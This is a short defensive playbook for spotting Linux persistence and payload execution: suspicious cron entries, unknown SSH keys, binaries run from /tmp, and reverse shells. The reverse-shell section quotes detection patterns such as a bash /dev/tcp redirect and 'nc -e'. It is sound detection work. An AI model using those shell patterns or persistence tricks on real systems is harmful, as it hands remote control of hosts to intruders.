# Playbook: Linux persistence and payload execution

## Cron persistence
Writes to `/etc/cron.d`, `/var/spool/cron` or `crontab <file>` executions outside configuration
management are suspicious. Compare the new entry with the package database and change records.
Look for commands that download content or execute from `/tmp`, `/var/tmp` or `/dev/shm`.

## SSH authorized keys
A modified `authorized_keys` grants durable access that survives password rotation. Compare
key fingerprints with the approved inventory; remove unknown keys and investigate the process
that wrote the file.

## Execution from world-writable directories
Binaries started from `/tmp`, `/var/tmp` or `/dev/shm` are typical for dropped payloads. Hash the
binary, check its parent process and network activity, and search for the same hash on other
hosts. Mount those directories with `noexec` where possible.

## Reverse shells
Patterns like `bash -i >& /dev/tcp/<ip>/<port>`, `nc -e` or Python socket+subprocess one-liners
connect an interactive shell to a remote listener. Identify the remote address, the parent
process (web server, implant, user shell) and whether the connection is still established.
